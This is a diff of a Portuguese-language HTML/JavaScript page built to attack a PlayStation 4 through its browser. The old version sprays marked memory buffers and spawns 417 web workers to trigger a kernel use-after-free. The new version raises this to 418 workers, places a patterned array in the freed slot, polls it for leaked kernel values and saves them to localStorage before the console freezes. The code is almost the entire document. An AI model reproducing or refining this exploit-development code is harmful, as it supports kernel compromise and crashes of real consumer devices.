@@ -1,143 +1,139 @@
 <!DOCTYPE html>
-<html lang="pt-PT">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 DEEP SCANNER</title>
+    <title>PS4 FREEZE RECORDER</title>
     <style>
         body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
+        h1 { color: #ff0; border-bottom: 2px solid #ff0; display: inline-block; }
         #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
-        #matrix { display: grid; grid-template-columns: repeat(16, 1fr); gap: 2px; max-width: 800px; margin: 0 auto; font-size: 0.8em; display: none; }
-        .cell { padding: 5px; background: #222; }
-        .changed { background: #f00 !important; font-weight: bold; color: #fff; border: 2px solid #fff; }
-        .safe { color: #555; }
+        #saved-data { display: none; background: #005; padding: 15px; border: 2px solid #0f0; text-align: left; word-break: break-all; }
+        .scanning { color: #0ff; animation: pulse 0.5s infinite; }
+        @keyframes pulse { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
     </style>
 </head>
 <body>
 
-    <h1>DEEP MEMORY SCANNER</h1>
-    <div id="status">A preparar...</div>
-    <div id="matrix"></div>
+    <h1>FREEZE RECORDER (CAIXA PRETA)</h1>
+
+    <div id="saved-data">
+        <h3>DADOS RECUPERADOS DO ÚLTIMO CRASH:</h3>
+        <div id="recovered-log"></div>
+        <button onclick="localStorage.clear(); location.reload();" style="margin-top:10px; padding:10px;">LIMPAR E TENTAR DE NOVO</button>
+    </div>
+
+    <div id="status">INICIALIZANDO...</div>
 
     <script>
-        // CONFIGURAÇÃO
-        const TARGET_THREADS = 417; 
-        const STRUCT_SIZE = 512;
-        const FILL_BYTE = 0xCC; // Padrão de fundo (204)
+        // --- VERIFICAÇÃO DE DADOS SALVOS ---
+        const saved = localStorage.getItem('ps4_blackbox');
+        if (saved) {
+            document.getElementById('saved-data').style.display = 'block';
+            document.getElementById('recovered-log').innerText = saved;
+            document.getElementById('status').innerText = "DADOS ENCONTRADOS! TIRE FOTO!";
+            document.body.style.backgroundColor = "#200";
+            // Para a execução aqui se já achamos algo
+            throw new Error("Dados recuperados.");
+        }
+
+        // --- CONFIGURAÇÃO ---
+        const TARGET_THREADS = 418; // O ponto do congelamento
+        const STRUCT_SIZE = 128; // 128 Int32 = 512 Bytes
+        const PATTERN = 0xCAFEBABE; // Nosso marcador seguro
 
         let workers = [];
-        let sensorArrays = []; // Arrays sensores
+        let sensorArray = new Uint32Array(STRUCT_SIZE);
         
         const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
         const url = URL.createObjectURL(blob);
+        
+        // Kamikaze
         const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
         const killerUrl = URL.createObjectURL(killerBlob);
 
         function start() {
-            document.getElementById('status').innerText = "1. ALOCANDO SENSORES...";
+            // Prepara o sensor
+            sensorArray.fill(PATTERN);
             
-            // Cria arrays sensores preenchidos com 0xCC
-            // Usamos Uint8Array para precisão byte-a-byte
-            try {
-                for(let i=0; i<800; i++) {
-                    let ab = new ArrayBuffer(STRUCT_SIZE);
-                    let arr = new Uint8Array(ab);
-                    arr.fill(FILL_BYTE);
-                    
-                    // Marcação de segurança no início (para não confundir com outros objetos)
-                    arr[0] = 0xAA; 
-                    arr[1] = 0xBB;
-                    
-                    sensorArrays.push(arr);
-                }
-            } catch(e) {
-                document.getElementById('status').innerText = "ERRO MEMÓRIA. REINICIE.";
-                return;
-            }
+            // Marca offsets importantes para facilitar a leitura depois
+            sensorArray[0] = 0x11111111; // Início
+            sensorArray[STRUCT_SIZE-1] = 0x99999999; // Fim
 
-            document.getElementById('status').innerText = "2. CRIANDO THREADS...";
+            document.getElementById('status').innerText = "1. SUBINDO PRESSÃO (418)...";
             createThreads();
         }
 
         function createThreads() {
             let i = setInterval(() => {
+                // Sobe até o limite
                 if (workers.length < TARGET_THREADS) {
                     workers.push(new Worker(url));
                     if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
                 } else {
                     clearInterval(i);
-                    document.getElementById('status').innerText = "3. PROVOCANDO O KERNEL...";
-                    setTimeout(triggerUAF, 1000);
+                    // Chegamos no ponto crítico.
+                    document.getElementById('status').innerText = "2. PROVOCANDO CONGELAMENTO...";
+                    document.getElementById('status').className = "scanning";
+                    
+                    // Inicia o Scanner ANTES de matar a thread, para pegar no pulo
+                    setInterval(scanLoop, 50); // Scaneia 20 vezes por segundo
+                    
+                    // Mata a thread para iniciar o congelamento
+                    triggerFreeze();
                 }
             }, 30);
         }
 
-        function triggerUAF() {
-            // Mata thread e espera que o Kernel escreva nos nossos sensores
+        function triggerFreeze() {
+            // Mata uma thread e tenta colocar nosso sensor no lugar
             const w = new Worker(killerUrl);
             w.terminate();
-            
-            // Espera um momento para o Kernel reagir (Race Condition)
-            setTimeout(scanSensors, 500);
+
+            // Tenta forçar o sensor para o lugar da thread
+            // Aqui não usamos spray gigante (evita OOM), usamos alocação precisa
+            // Criamos uma referência global para o Garbage Collector não limpar
+            window.targetHole = new Uint32Array(STRUCT_SIZE);
+            window.targetHole.set(sensorArray);
         }
 
-        function scanSensors() {
-            document.getElementById('status').innerText = "4. ANALISANDO DANOS...";
+        function scanLoop() {
+            // Verifica se o nosso array (window.targetHole) foi alterado pelo Kernel
+            const arr = window.targetHole;
             
-            let anomalies = [];
-            
-            for(let i=0; i<sensorArrays.length; i++) {
-                const arr = sensorArrays[i];
-                
-                // Verifica a marcação (se sumiu, o objeto foi totalmente sobrescrito)
-                if(arr[0] !== 0xAA || arr[1] !== 0xBB) {
-                    // Ignora, provavelmente foi reciclado pelo navegador
-                    continue; 
-                }
+            // Se o array ainda não foi criado (race condition), ignora
+            if (!arr) return;
 
-                // Verifica byte a byte
-                for(let k=2; k<STRUCT_SIZE; k++) {
-                    if(arr[k] !== FILL_BYTE) {
-                        anomalies.push({offset: k, val: arr[k]});
+            let diffFound = false;
+            let log = "";
+
+            for(let i=0; i < STRUCT_SIZE; i++) {
+                // Se o valor não é o nosso padrão e não é nossas marcas de início/fim
+                if (arr[i] !== PATTERN && arr[i] !== 0x11111111 && arr[i] !== 0x99999999) {
+                    
+                    // ACHAMOS ALGO!
+                    // Formata em Hex
+                    const val = arr[i] >>> 0; // Converte para unsigned
+                    const hex = "0x" + val.toString(16).padStart(8, '0');
+                    
+                    // Filtra zeros (o kernel pode escrever zeros, mas queremos endereços)
+                    if (val !== 0) {
+                        log += `OFFSET ${i*4}: ${hex}\n`; // i*4 para bytes
+                        diffFound = true;
                     }
                 }
+            }
+
+            if (diffFound) {
+                // SALVA IMEDIATAMENTE NO DISCO
+                // Se o console travar 1ms depois, isso estará salvo.
+                localStorage.setItem('ps4_blackbox', log);
                 
-                if(anomalies.length > 0) {
-                    report(anomalies);
-                    return;
-                }
+                document.getElementById('status').innerText = "CAPTURA SALVA! AGUARDANDO CRASH...";
+                document.body.style.backgroundColor = "#050";
             }
-            
-            document.getElementById('status').innerText = "NADA DETECTADO. TENTE RECARREGAR (F5).";
         }
 
-        function report(anomalies) {
-            document.getElementById('status').innerText = "ALTERAÇÃO DETECTADA!!";
-            document.getElementById('status').style.background = "#050";
-            
-            const m = document.getElementById('matrix');
-            m.style.display = 'grid';
-            
-            // Mostra onde mudou
-            let html = "";
-            let changesText = "OFFSETS ALTERADOS:\n";
-            
-            // Mapeia os primeiros 512 bytes visualmente
-            for(let i=0; i<STRUCT_SIZE; i++) {
-                let changed = anomalies.find(a => a.offset === i);
-                if(changed) {
-                    html += `<div class="cell changed">${changed.val.toString(16).padStart(2,'0')}</div>`;
-                    changesText += `Offset ${i}: 0x${changed.val.toString(16)}\n`;
-                } else {
-                    html += `<div class="cell safe">..</div>`;
-                }
-            }
-            m.innerHTML = html;
-            
-            console.log(changesText);
-            alert(changesText); // Popup para chamar atenção
-        }
-
-        setTimeout(start, 500);
+        setTimeout(start, 2000);
 
     </script>
 </body>
